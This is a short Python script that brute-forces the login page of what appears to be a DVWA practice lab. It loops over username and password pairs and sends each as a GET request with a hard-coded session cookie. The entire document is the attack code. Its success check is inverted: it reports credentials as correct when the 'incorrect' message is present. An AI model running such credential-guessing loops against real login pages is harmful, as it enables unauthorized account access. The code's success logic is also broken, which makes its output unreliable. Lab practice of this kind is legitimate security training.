import requests
header={"Cookie":"security=low;PHPSESSID=e2f43ab2911ea4d177541dc8380f591d;w"}
username_list={"admin","password"}
password_list={"admin","password"}
for username in username_list:
    for password in password_list:
        url="http://***.***.*.*/dvwa/vulnerabilities/brute/?username="+username+"&password="+password+"&Login=Login"
        result=requests.get(url=url, headers=header)
        print("Username:", username)
        print("Password:", password)
        print("Status Code:", result.status_code)
        print("Message lenght", len(result.content))
        if "Username and/or password incorrect." in str(result.content):
            print("Username and password correct")
        print("="*10)
